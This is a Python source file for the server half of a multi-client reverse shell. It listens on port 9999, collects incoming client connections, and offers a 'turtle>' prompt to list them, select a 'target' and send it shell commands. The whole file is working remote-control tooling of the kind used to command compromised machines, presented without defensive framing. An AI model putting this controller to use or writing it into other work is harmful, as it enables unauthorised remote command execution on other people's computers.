import socket
import threading
import sys
from queue import Queue
import time

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []  # For computers
all_addresses = []  # For `humans`


# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))

# Bind socket to port and wait for connection from client


def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()

# Accept connections from multiple clients and save to a list:
# This is CONCURRENT version:


def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1) # no time out
            all_connections.append(conn)
            all_addresses.append(address)
            print('\nConnection has been established: ' + address[0])
        except:
            print("\nError While Establishing Connection")

# Interactive prompt for sending commands remotely


def start_turtle():
    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not rezognized")

# Displays all current connections:


def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(''))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + ' :||: ' + str(all_addresses[i][0]) + ' :||: ' + str(all_addresses[i][1]) + '\n'
    print('------ CLIENTS -------' + '\n' + results)

# Select a target client


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end='')
        return conn
    except:
        print("Invalid selection")
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), 'utf-8')
                print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break

# Create worker threads


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do the next job in the queue (one handsles the connection, other sends
# commands)


def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()

# Each list item is a new job


def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_job()


# def main():
# socket_create()
# socket_bind()
# socket_accept()

# Establishing a connection with client (socket must be listening for them)
# This is NOT A concurrent version:
# def socket_accept():
#     conn, address = s.accept()
#     print("connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
#     send_commands(conn)
#     conn.close()

# Send commands
# This is NOT A concurrent version:
# def send_commands(conn):
#     while True:
#         command = input()
#         if command == 'quit':
#             conn.close()
#             s.close()
#             sys.exit()
#         if len(str.encode(command)) > 0:
#             conn.send(str.encode(command))
#             client_response = str(conn.recv(1024), "utf-8")
#             print(client_response, end='')


#
